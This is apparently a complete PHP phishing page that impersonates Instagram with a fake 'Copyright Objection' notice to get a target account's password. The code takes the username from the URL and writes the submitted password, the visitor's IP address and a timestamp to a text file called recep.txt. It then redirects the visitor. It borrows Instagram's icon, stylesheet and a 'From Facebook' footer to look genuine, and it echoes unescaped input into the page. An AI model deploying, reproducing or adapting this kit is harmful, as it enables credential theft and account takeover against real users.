<?php

error_reporting(0);

$nick=$_GET["nick"];
if($nick==="" || $nick===" "){$nick="instagram";}else if($nick==fale){$nick="instagram";}
if ($_POST) {
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$nick=$_GET["nick"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
     $file = fopen('recep.txt', 'a');
fwrite($file, " username : ".$nick."\n\n" ." password: ".$password. "\n\n"." Ip Adress: " .$ip."\n\n".   " Time: " .$date.  "\n\n\n");

fclose($file);

  
   header("Location: mail.php");
}


?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<title>Copyright on <?php $nick;
	?></title>
	
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
</head>
<body><center>
	<header>

		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTjtjBw4xwF01ZdKL1cmnYZD3vdavlQPOWA7w&usqp=CAU" width="180">

	</header>

	<br>

	<main>


		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSTogeeq1LoCIszrCDe0xwZKYpCqub8Bknz0g&usqp=CAU" width="80">
		
			<p style="letter-spacing:0px;color:#888;"><b>Hi <?php echo $nick; ?> </b><br>
				We are dont reviewed your account for "Copyright Objection",For that we need to some personal information,Please fill the form with correct info,
				and we will return you on possible time
			</p><br>
			<form method="post">
			<input type="password" name="password" placeholder=" Password" required="on">
			<br>
			
			<button type="submit" class="a_adaskpd">Continue as <?php echo"@".  $nick; ?></button>
		</form>
	</main>






<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{border-bottom:1px solid #cecece;
		background:white;
		
		padding-top:10px;}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
			color:#333;
			font-weight:400;
			word-spacing:1px;
			letter-spacing:1px;
			width:350px;
			max-width:90%;
			font-size:15px;
		}main input{
			transition:1s;
			padding:5px;
			border:none;
			width:180px;
			height:33px;
			outline:none;
			border:1px solid #cecece;
			padding-left:5px;
			font-size:16px;
			background:#fafafa;
			border-radius:4px;
			font-size:18px;

		}main input::placeholder{
			font-size:15px;
			color:#999;

		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;
			background:#f5f6f8;

		}
</style>

<center>	
<link rel="stylesheet" href="https://instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">


	<div class="bottom">
		
	<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>

</center>




</body></html>